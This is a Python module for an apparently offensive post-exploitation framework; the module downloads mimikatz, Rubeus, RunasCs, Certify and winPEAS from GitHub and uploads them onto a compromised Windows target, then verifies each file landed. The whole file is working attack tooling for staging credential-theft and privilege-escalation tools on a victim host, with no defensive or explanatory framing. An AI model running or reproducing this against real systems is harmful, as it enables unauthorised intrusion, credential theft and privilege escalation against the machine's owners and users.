from __future__ import annotations

import os
import tempfile
import time
import urllib.request
import zipfile

from koi.modules.blueprint import KoiModule

MIMIKATZ_ZIP_URL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"

TOOLS: dict[str, str] = {
    "Rubeus.exe":      "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Rubeus.exe",
    "RunasCs.exe":     "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/RunasCs.exe",
    "Certify.exe":     "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Certify.exe",
    "winPEAS.exe":     "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/winPEAS.exe",
}


class PopulateWinModule(KoiModule):
    name        = "populate_win"
    description = "Upload common exploitation tools (Rubeus, RunasCs, Certify, winPEAS, mimikatz) on the target."
    usage       = "populate_win <id> [-o <remote_dir>]"
    category    = "Other"
    platform    = "windows_ps"
    arguments   = [
        {
            "flags":   ["-o", "--output-dir"],
            "default": None,
            "help":    "Remote directory where tools will be saved (default: current directory)",
        },
    ]

    def _fetch_url(self, url: str) -> bytes:
        """Download *url* locally and return its raw bytes."""
        with urllib.request.urlopen(url, timeout=30) as resp:
            return resp.read()

    def _fetch_mimikatz_exe(self) -> bytes:
        """Download mimikatz_trunk.zip locally and return the x64/mimikatz.exe bytes."""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            tmp_path = tmp.name
        try:
            urllib.request.urlretrieve(MIMIKATZ_ZIP_URL, tmp_path)
            with zipfile.ZipFile(tmp_path) as zf:
                return zf.read("x64/mimikatz.exe")
        finally:
            os.unlink(tmp_path)

    def run(self) -> None:
        out_dir = (self.args.output_dir or ".").rstrip("\\")

        self.status(f"Populating {out_dir} with exploitation tools...")
        print()

        results: dict[str, str] = {}

        for name, url in TOOLS.items():
            dest = f"{out_dir}\\{name}"
            with self.spinner(f"Fetching and uploading {name}..."):
                try:
                    raw = self._fetch_url(url)
                    ok  = self._upload_bytes(raw, dest)
                    if ok:
                        time.sleep(1.0)
                        ok = self._win_query(f"(Test-Path '{dest}').ToString()").strip().lower() == "true"
                except Exception as exc:
                    ok = False
                    results[name] = f"error: {exc}"
                    continue
            results[name] = dest if ok else "FAILED"

        dest = f"{out_dir}\\mimikatz.exe"
        with self.spinner("Downloading mimikatz..."):
            try:
                raw = self._fetch_mimikatz_exe()
                ok  = self._upload_bytes(raw, dest)
                if ok:
                    time.sleep(1.0)
                    ok = self._win_query(f"(Test-Path '{dest}').ToString()").strip().lower() == "true"
            except Exception as exc:
                ok = False
                results["mimikatz.exe"] = f"error: {exc}"
        if "mimikatz.exe" not in results:
            results["mimikatz.exe"] = dest if ok else "FAILED"

        from koi.utils.ui import _y, _r, _gr
        display = {}
        for name, val in results.items():
            if val == "FAILED" or val.startswith("error"):
                display[name] = _r(val)
            else:
                display[name] = _y(val)

        print()
        self.box("populate_win results", display)
